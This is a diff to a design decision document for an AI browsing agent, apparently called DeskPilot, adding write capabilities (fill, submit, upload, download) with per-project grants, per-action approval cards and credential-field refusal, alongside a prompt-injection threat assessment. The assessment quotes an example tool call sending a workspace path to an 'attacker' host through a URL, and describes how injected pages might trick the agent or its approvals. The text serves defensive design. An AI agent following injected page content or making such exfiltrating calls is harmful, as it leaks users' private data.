@@ -92,10 +92,13 @@ in `RequiredModules.psd1` or anywhere else.
 ## Trifecta assessment for this workflow
 
 The prompt requires breaking at least one leg by architecture. Two are broken
-outright, and the third is the one that needed designing.
+outright in the reading surface, and the third is the one that needed designing.
 
-- **Agency — broken.** The Tool surface contains no action with an external
-  effect. There is nothing to submit, so an injected page cannot cause one.
+- **Agency — broken while reading, granted back deliberately for writing.** The
+  reading actions contain nothing with an external effect, so an injected page
+  has nothing to reach for. Write capabilities (below) restore part of this leg
+  on purpose, which is why they are per-Project, absent by default, and approved
+  per action rather than tiered against a safe-list.
 - **Private data, browser side — broken.** No credential or local path is
   reachable from the browser context.
 - **Egress — the real exposure, and not obvious.** The browser holds no secrets,
@@ -104,6 +107,63 @@ outright, and the third is the one that needed designing.
   induces `browser_navigate("https://attacker/?ctx=<workspace path>")` exfiltrates
   through the URL itself, with no file read and no command run. This is why an
   open domain policy was rejected.
+
+## Write capabilities, added 2026-09-05
+
+The read-only slice broke the agency leg by having no action with an external
+effect. The user asked for submit, upload, download and delete to be available
+on request, per Project. That request is in scope — the prompt requires
+"per-action approval for submissions, uploads, downloads … and any action with
+external effect" — but it materially changes the posture: **approval stops being
+a backstop and becomes the only thing between an injected page and an
+irreversible action.**
+
+**Capabilities are per Project, from Settings only, absent by default.**
+`browserActions` may contain `fill`, `submit`, `upload`, `download`. Reading
+needs no grant. An ungranted action is refused *before* any card is offered, so
+an injected page cannot manufacture the moment in which a user grants one.
+
+**There is no `delete` capability**, because there is no delete action. Removing
+something on a site is a button press, so it is covered by `submit` and named on
+that button's card. A capability named after an intention rather than a
+mechanism would imply DeskPilot can tell a Save button from a Delete button,
+which it cannot.
+
+**No safe-list.** Decision 0008 tiers terminal commands because `git status` is
+genuinely routine and a gate that interrupts on it gets switched off. There is no
+equivalent on the web: every write has an external effect on somebody else's
+system, so a "routine submission" is a category error and tiering would only be a
+way of not asking.
+
+**The card shows the values, and the fingerprint covers them.** A form fill lists
+every field name and value; a press names the control; an upload shows the
+resolved absolute path; a download shows the quarantine folder. "Submit a form"
+is not a decision anyone can make. The fingerprint includes the values
+themselves, so an approval for one set cannot be spent on another — the
+substitution an injected page would want.
+
+**Credential fields are refused, never masked.** The check is made in the
+supervisor against the live input's own `type` and `autocomplete`, because a
+field name is what an attacker controls. A conservative name pattern is a second
+layer that can only add a refusal. The user signs in themselves.
+
+**Uploads are confined, downloads are quarantined.** An upload path is resolved
+against the Project with `Resolve-DpWorkspacePath` before the card is raised, so
+a card never names a file outside the Project; page content never supplies a
+path. A download lands in a folder under the data directory, never in the Project
+where the File Tools would read it as the user's own work, and the page-supplied
+filename is reduced to a stripped leaf first.
+
+**A press re-checks scope**, because a form that posts to another site is a
+navigation wearing a button.
+
+### Known gap
+
+`click_link` still follows in-scope links without an approval, and a link can
+have a side effect on a badly-built site. It is unchanged from the read-only
+slice and bounded by scope, but it is the one action with a plausible external
+effect that is not gated. Naming it rather than quietly relying on "links are
+reads".
 
 ## Domain policy: scope-plus-prompt
 
